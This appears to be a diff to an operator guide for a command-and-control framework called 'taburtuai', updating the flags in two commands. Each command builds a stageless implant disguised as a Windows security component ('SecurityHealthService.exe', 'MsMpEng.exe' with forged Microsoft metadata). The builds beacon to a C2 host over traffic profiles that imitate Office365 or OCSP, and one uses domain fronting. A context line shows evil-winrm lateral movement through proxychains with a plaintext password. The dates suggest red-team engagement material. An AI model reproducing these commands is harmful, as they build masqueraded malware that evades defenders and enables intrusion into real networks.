@@ -18,17 +18,16 @@ Build a stealth agent disguised as a Windows security component:
 
 ```bash
 ./bin/taburtuai-generate stageless \
-  --server https://c2.example.com \
+  --c2 https://c2.example.com \
   --key 'EngKey2026' \
   --c2-profile office365 \
   --profile stealth \
   --masq-company "Microsoft Corporation" \
   --masq-desc "Windows Security Health Service" \
-  --masq-origfile "SecurityHealthService.exe" \
+  --masq-orig "SecurityHealthService.exe" \
   --kill-date 2026-06-30 \
-  --strip \
   --no-gui \
-  --os windows --arch amd64 \
+  --arch amd64 \
   --output ./builds/SecurityHealthService.exe
 ```
 
@@ -260,18 +259,17 @@ proxychains evil-winrm -i 10.0.10.20 -u finance.user -p ERPAccess2024!
 
 ```bash
 ./bin/taburtuai-generate stageless \
-  --server https://c2.example.com \
+  --c2 https://c2.example.com \
   --key 'EngKey2026LT' \
   --c2-profile ocsp \
   --profile paranoid \
   --front-domain cdn.azure.microsoft.com \
   --masq-company "Microsoft Corporation" \
   --masq-desc "Antimalware Service Executable" \
-  --masq-origfile "MsMpEng.exe" \
+  --masq-orig "MsMpEng.exe" \
   --kill-date 2026-06-30 \
-  --strip \
   --no-gui \
-  --os windows --arch amd64 \
+  --arch amd64 \
   --output ./builds/MsMpEng_upd.exe
 ```
 
